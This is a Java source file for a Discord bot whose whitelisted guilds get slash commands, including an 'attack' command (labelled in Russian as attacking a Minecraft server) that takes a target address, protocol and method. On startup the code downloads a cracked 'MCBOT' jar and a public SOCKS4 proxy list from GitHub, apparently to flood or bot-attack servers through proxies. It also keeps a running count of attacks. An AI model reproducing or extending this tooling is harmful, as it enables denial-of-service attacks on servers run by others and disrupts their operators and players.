package net.servokio.q4mc;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.interactions.commands.OptionType;
import net.dv8tion.jda.api.interactions.commands.build.Commands;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import net.servokio.q4mc.discord.Discord;
import net.servokio.q4mc.listeners.DiscordListener;
import net.servokio.q4mc.threads.ThreadManager;
import net.servokio.q4mc.utils.Methods;
import net.servokio.q4mc.utils.Protocols;

import javax.security.auth.login.LoginException;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

public class MainDC {
    public JDA jda;
    String[] args;
    public static MainDC main;
    public int attacks;

    //Modules
    public Discord discord;
    public Protocols protocols;
    public Methods methods;
    public ThreadManager threadManager;

    public MainDC(String[] args){
        this.args = args;
        this.discord = new Discord();
        this.protocols = new Protocols();
        this.methods = new Methods();
        this.threadManager = new ThreadManager();
    }

    public static void setInstance(MainDC main){
        MainDC.main = main;
    }

    public static MainDC getInstance(){
        return main;
    }

    public void init() {
        setInstance(this);
        File dir1 = new File("./server");
        System.out.println(dir1.getAbsolutePath());
        if (!dir1.exists()) dir1.mkdirs();
        File dir = new File("./server/jars");
        if (!dir.exists()) dir.mkdirs();
        File jar = new File("./server/jars/mcbot.jar");
        try{
            if (jar.exists()) {
                //Если есть
                updateProxy();
            } else {
                URL website = new URL("https://github.com/llyxa05/MCBOT-crack/raw/main/MCBOT.jar");
                ReadableByteChannel rbc = Channels.newChannel(website.openStream());
                FileOutputStream fos = new FileOutputStream("./server/jars/mcbot.jar");
                fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
                updateProxy();
            }
            startJDA();
        } catch (Exception e){
            System.out.println("E: "+e.getMessage());
            System.exit(0);
        }
    }

    private void updateProxy() throws IOException {
        URL url = new URL("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt");
        ReadableByteChannel rbc = Channels.newChannel(url.openStream());
        FileOutputStream foss = new FileOutputStream("./proxies.txt");
        foss.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
    }

    public void startJDA(){
        try {
            jda = JDABuilder
                    .createDefault(Config.TOKEN)
                    .enableIntents(GatewayIntent.GUILD_MEMBERS)
                    .setChunkingFilter(ChunkingFilter.ALL)
                    .setMemberCachePolicy(MemberCachePolicy.ALL)
                    .setAutoReconnect(true)
                    .addEventListeners(new DiscordListener())
                    .build();
            jda.awaitReady();
            for (Guild guild : jda.getGuilds()) guild.loadMembers().onSuccess(members -> System.out.println("Loaded " + members.size() + " members in guild " + guild)).onError(throwable -> System.out.println("Failed to retrieve members of guild " + guild)).get();
        } catch (LoginException | InterruptedException e) {
            System.out.println(e.getMessage());
        }
    }

    public void onReady() {
        for(Guild g : jda.getGuilds()) setupGuild(g);
    }

    public void setupGuild(Guild guild) {
        if(Config.WHITELIST_SERVERS.contains(guild.getId())){
            try{
                guild.updateCommands().addCommands(
                        Commands.slash("info", "Информация"),
                        Commands.slash("help", "Помочь по командам"),
                        Commands.slash("attack", "Атаковать сервер майкрафт")
                                .addOption(OptionType.STRING, "address", "адрес сервера", true)
                                .addOptions(this.protocols.getDiscordData())
                                .addOptions(this.methods.getDiscordData()),
                        Commands.slash("resolve", "Информация о сервере")
                                .addOption(OptionType.STRING, "address", "адрес сервера", true)
                ).queue();
                System.out.println("Updated commands for G: "+guild.getName());
            } catch (Exception e){
                System.out.println(e.getMessage());
                System.out.println("E: Missing Access on guildID: "+guild.getId());
            }
        }
    }

    public int incAtt(){
        attacks++;
        return attacks;
    }

    public static void log(String message){
        System.out.println(message);
    }
}
